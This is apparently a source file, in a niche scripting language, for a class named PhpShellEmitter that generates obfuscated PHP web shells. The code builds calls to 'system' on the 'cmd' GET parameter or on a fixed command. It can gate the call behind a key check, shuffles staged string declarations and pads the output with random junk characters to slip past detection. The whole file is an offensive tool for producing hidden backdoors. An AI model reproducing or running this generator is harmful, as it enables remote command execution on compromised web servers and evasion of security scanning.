from('random', 'shuffle', 'randint');
// Todo:
// Strings
// Everything in array
// Text prefix/suffix
class PhpShellEmitter {
    stages = [ [], [], [], [] ],
    emitter = null,
    prefix = null,
    suffix = null,
    padMin = 10,
    padMax = 32,
    
    junkChars = 
        range(0x21, 0x7f) 
        @where(@!= '<')
        @where(@!= '#')
        @select(chr),

    __init__: @{ self.emitter = PhpEmitter() },

    stageDecl: @(stage, value) {
        id, assign = self.emitter.declStmt(value);
        self.stages[stage].append(assign);

        ret id;
    },

    varRef: @(stage, name) self.stageDecl(
        stage, 
        '$' + self.stageDecl(stage - 1, self.emitter.string(name, false))),

    emit: @(command=null, pad=false, key=null) {
        self.emitter.chr = self.stageDecl(0, self.emitter.string('chr', false, false));
        system = self.stageDecl(1, self.emitter.string('system', false));
        keyExists = null;
        
        if (key != null) {
            keyExists = self.stageDecl(1, self.emitter.string('array_key_exists', false));
        }

        if (command == null) {
            input = self.varRef(2, '_GET');

            systemCallStmt = self.emitter.callStmt(
                system, 
                self.emitter.arrayAccess(input, self.emitter.string('cmd', false)));
        } else {
            cmdStr = self.emitter.string(command, false);
            systemCallStmt = self.emitter.callStmt(system, cmdStr);
		}
        
        if (key != null) {
            systemCallStmt = 'if({}){}'.format(
                self.emitter.call(
                    keyExists,
                    '{},{}'.format(
                        self.emitter.string(key, false),
                        input)),
                systemCallStmt);
        }

        self.stages[3].append(systemCallStmt);

        self.stages @skip(1) @iter(shuffle);
        php = '';
        x = self.stages |> flatten |> addAll |> self.emitter.doc;
		ret !pad ? x : x |> self.pad;
	},
    
    emitJunk: @() 
        range(0, randint(self.padMin, self.padMax))
        @select(@(x) self.emitter.getRandChar())
        addAll,
        
    pad: @(value) {
        self.prefix = self.emitJunk();
        self.suffix = self.emitJunk();
        
        ret self.prefix + value + self.suffix;
    },
};